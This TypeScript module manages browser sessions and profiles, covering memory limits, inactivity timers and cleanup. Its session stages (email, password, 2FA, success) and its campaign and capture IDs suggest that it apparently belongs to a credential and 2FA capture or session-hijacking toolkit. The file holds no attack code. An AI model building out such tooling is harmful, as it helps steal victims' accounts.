import { Browser, Page, BrowserContext } from 'patchright';
import { RESOURCE_LIMITS } from '../config/resources';
import { logger } from '../utils/logger.util';
import * as fs from 'fs';

// Session context stored in memory
export interface SessionContext {
  sessionId: string;
  browser: Browser;
  page: Page;
  stage: 'email' | 'password' | '2fa' | 'success' | 'expired';
  campaignId: string;
  captureId: string;
  createdAt: Date;
  lastActivity: Date;
  isActive: boolean;
  email?: string;
  proxyUsed?: string;
  expiryTimer?: NodeJS.Timeout; // Timer handle for inactivity cleanup
}

// Launched profile context stored in memory
export interface LaunchedProfileContext {
  profileId: string;
  browserContext: BrowserContext;
  userId: string;
  launchedAt: Date;
  lastInteraction: Date;
  isActive: boolean;
  activityWarned: boolean;
}

// In-memory registries
const activeSessions = new Map<string, SessionContext>();
const launchedProfiles = new Map<string, LaunchedProfileContext>();

// Session TTL: 30 minutes of inactivity (not from creation)
const SESSION_INACTIVITY_TTL_MS = 30 * 60 * 1000; // 30 minutes

export class ResourceManagerService {
  /**
   * Get accurate system memory ratio (Linux-aware)
   * Reads /proc/meminfo to get MemAvailable which includes reclaimable cache
   */
  private getMemoryRatio(): number {
    try {
      const meminfo = fs.readFileSync('/proc/meminfo', 'utf8');
      const totalMatch = meminfo.match(/MemTotal:\s+(\d+)\s+kB/);
      const availMatch = meminfo.match(/MemAvailable:\s+(\d+)\s+kB/);
      if (totalMatch && availMatch) {
        const totalKb = parseInt(totalMatch[1], 10);
        const availKb = parseInt(availMatch[1], 10);
        return (totalKb - availKb) / totalKb;
      }
    } catch {}
    // fallback: Node os.freemem() — inaccurate on Linux but better than crashing
    const usage = process.memoryUsage();
    return usage.heapUsed / usage.heapTotal;
  }

  /**
   * Get current memory usage (system RAM, not just Node heap)
   */
  getMemoryUsage() {
    const usage = process.memoryUsage();
    const systemMemRatio = this.getMemoryRatio();
    return {
      heapUsed: Math.round(usage.heapUsed / 1024 / 1024), // MB
      heapTotal: Math.round(usage.heapTotal / 1024 / 1024), // MB
      external: Math.round(usage.external / 1024 / 1024), // MB
      rss: Math.round(usage.rss / 1024 / 1024), // MB (total memory)
      percentage: (systemMemRatio * 100).toFixed(2), // System RAM percentage (accurate on Linux)
    };
  }

  /**
   * Get current CPU usage
   */
  getCpuUsage() {
    const usage = process.cpuUsage();
    return {
      user: Math.round(usage.user / 1000), // milliseconds
      system: Math.round(usage.system / 1000), // milliseconds
    };
  }

  /**
   * Check if we can start a new session
   * NOTE: No hard capacity limit - inactivity-based cleanup ensures we never run out
   */
  canStartNewSession(): boolean {
    const memUsage = this.getMemoryRatio();

    // Only check memory threshold (no hard session count limit)
    if (memUsage >= RESOURCE_LIMITS.MEMORY_THRESHOLD) {
      logger.warn(`Cannot start new session: memory threshold exceeded (${(memUsage * 100).toFixed(2)}%)`);
      return false;
    }

    return true;
  }

  /**
   * Check if we can launch a profile
   */
  canLaunchProfile(): boolean {
    const launchedCount = launchedProfiles.size;

    if (launchedCount >= RESOURCE_LIMITS.MAX_LAUNCHED_PROFILES) {
      logger.warn(`Cannot launch profile: at max capacity (${launchedCount}/${RESOURCE_LIMITS.MAX_LAUNCHED_PROFILES})`);
      return false;
    }

    return true;
  }

  /**
   * Register active session with inactivity-based TTL
   * Always succeeds (no hard capacity limit - cleanup is automatic)
   */
  registerSession(sessionId: string, context: Omit<SessionContext, 'sessionId' | 'createdAt' | 'lastActivity' | 'isActive' | 'expiryTimer'>): boolean {
    if (!this.canStartNewSession()) {
      return false;
    }

    // Create expiry callback
    const expiryCallback = async () => {
      logger.warn(`Session ${sessionId} expired due to inactivity (30 min)`);
      await this.destroySession(sessionId);
    };

    // Set 30-min inactivity timer
    const expiryTimer = setTimeout(expiryCallback, SESSION_INACTIVITY_TTL_MS);

    const sessionContext: SessionContext = {
      sessionId,
      ...context,
      createdAt: new Date(),
      lastActivity: new Date(),
      isActive: true,
      expiryTimer,
    };

    activeSessions.set(sessionId, sessionContext);
    logger.success(`Session registered: ${sessionId} (${activeSessions.size} active, 30min TTL)`);

    return true;
  }

  /**
   * Touch session - reset inactivity timer (call this on every user action)
   */
  touchSession(sessionId: string): void {
    const session = activeSessions.get(sessionId);
    if (!session) return;

    // Clear old timer
    if (session.expiryTimer) {
      clearTimeout(session.expiryTimer);
    }

    // Set new 30-min timer
    const expiryCallback = async () => {
      logger.warn(`Session ${sessionId} expired due to inactivity (30 min)`);
      await this.destroySession(sessionId);
    };

    session.expiryTimer = setTimeout(expiryCallback, SESSION_INACTIVITY_TTL_MS);
    session.lastActivity = new Date();
    session.isActive = true;

    logger.info(`Session ${sessionId} activity reset - new 30min TTL`);
  }

  /**
   * Get session from registry
   */
  getSession(sessionId: string): SessionContext | undefined {
    return activeSessions.get(sessionId);
  }

  /**
   * Update session activity
   */
  updateSessionActivity(sessionId: string, stage?: SessionContext['stage']): void {
    const session = activeSessions.get(sessionId);
    if (session) {
      session.lastActivity = new Date();
      session.isActive = true;
      if (stage) {
        session.stage = stage;
      }
    }
  }

  /**
   * Destroy session immediately (on success or unrecoverable error)
   * Clears timer, closes browser, deletes from map
   */
  async destroySession(sessionId: string): Promise<void> {
    const session = activeSessions.get(sessionId);
    if (!session) return;

    // Clear expiry timer
    if (session.expiryTimer) {
      clearTimeout(session.expiryTimer);
    }

    try {
      // Close browser
      await session.browser.close();
      logger.info(`Session browser closed: ${sessionId}`);
    } catch (error) {
      logger.error(`Error closing session browser ${sessionId}:`, error);
    }

    // Remove from registry
    activeSessions.delete(sessionId);
    logger.success(`Session destroyed: ${sessionId} (${activeSessions.size} active)`);
  }

  /**
   * Close session (alias for destroySession for backwards compatibility)
   */
  async closeSession(sessionId: string): Promise<void> {
    await this.destroySession(sessionId);
  }

  /**
   * Register launched profile
   */
  registerLaunchedProfile(profileId: string, context: Omit<LaunchedProfileContext, 'profileId' | 'launchedAt' | 'lastInteraction' | 'isActive' | 'activityWarned'>): boolean {
    if (!this.canLaunchProfile()) {
      return false;
    }

    const profileContext: LaunchedProfileContext = {
      profileId,
      ...context,
      launchedAt: new Date(),
      lastInteraction: new Date(),
      isActive: true,
      activityWarned: false,
    };

    launchedProfiles.set(profileId, profileContext);
    logger.success(`Profile launched: ${profileId} (${launchedProfiles.size}/${RESOURCE_LIMITS.MAX_LAUNCHED_PROFILES})`);

    return true;
  }

  /**
   * Get launched profile from registry
   */
  getLaunchedProfile(profileId: string): LaunchedProfileContext | undefined {
    return launchedProfiles.get(profileId);
  }

  /**
   * Update profile interaction
   */
  updateProfileInteraction(profileId: string): void {
    const profile = launchedProfiles.get(profileId);
    if (profile) {
      profile.lastInteraction = new Date();
      profile.isActive = true;
      profile.activityWarned = false; // Reset warning
    }
  }

  /**
   * Close launched profile
   */
  async closeLaunchedProfile(profileId: string): Promise<void> {
    const profile = launchedProfiles.get(profileId);
    if (!profile) return;

    try {
      // Close browser context
      await profile.browserContext.close();
      logger.info(`Profile browser closed: ${profileId}`);
    } catch (error) {
      logger.error(`Error closing profile browser ${profileId}:`, error);
    }

    // Remove from registry
    launchedProfiles.delete(profileId);
    logger.success(`Profile closed: ${profileId} (${launchedProfiles.size}/${RESOURCE_LIMITS.MAX_LAUNCHED_PROFILES})`);
  }

  /**
   * Get idle sessions (for cleanup)
   */
  getIdleSessions(idleThresholdMs: number = RESOURCE_LIMITS.SESSION_IDLE_TIMEOUT): SessionContext[] {
    const now = Date.now();
    return Array.from(activeSessions.values()).filter(session => {
      const idleTime = now - session.lastActivity.getTime();
      return !session.isActive && idleTime > idleThresholdMs;
    });
  }

  /**
   * Get idle profiles (for cleanup)
   */
  getIdleProfiles(idleThresholdMs: number = RESOURCE_LIMITS.PROFILE_HARD_TIMEOUT): LaunchedProfileContext[] {
    const now = Date.now();
    return Array.from(launchedProfiles.values()).filter(profile => {
      const idleTime = now - profile.lastInteraction.getTime();
      return !profile.isActive && idleTime > idleThresholdMs;
    });
  }

  /**
   * Get all active sessions
   */
  getAllActiveSessions(): SessionContext[] {
    return Array.from(activeSessions.values());
  }

  /**
   * Get all launched profiles
   */
  getAllLaunchedProfiles(): LaunchedProfileContext[] {
    return Array.from(launchedProfiles.values());
  }

  /**
   * Get resource statistics
   */
  getResourceStats() {
    const memory = this.getMemoryUsage();
    const cpu = this.getCpuUsage();

    return {
      memory,
      cpu,
      sessions: {
        active: activeSessions.size,
        max: null,
        percentage: null,
        canStartNew: this.canStartNewSession(),
      },
      profiles: {
        launched: launchedProfiles.size,
        max: RESOURCE_LIMITS.MAX_LAUNCHED_PROFILES,
        percentage: ((launchedProfiles.size / RESOURCE_LIMITS.MAX_LAUNCHED_PROFILES) * 100).toFixed(2),
        canLaunchNew: this.canLaunchProfile(),
      },
      uptime: process.uptime(),
    };
  }

  /**
   * Warn profile about inactivity
   */
  warnProfileInactivity(profileId: string): void {
    const profile = launchedProfiles.get(profileId);
    if (profile) {
      profile.activityWarned = true;
      logger.warn(`Profile inactivity warning sent: ${profileId}`);
    }
  }
}

export default new ResourceManagerService();
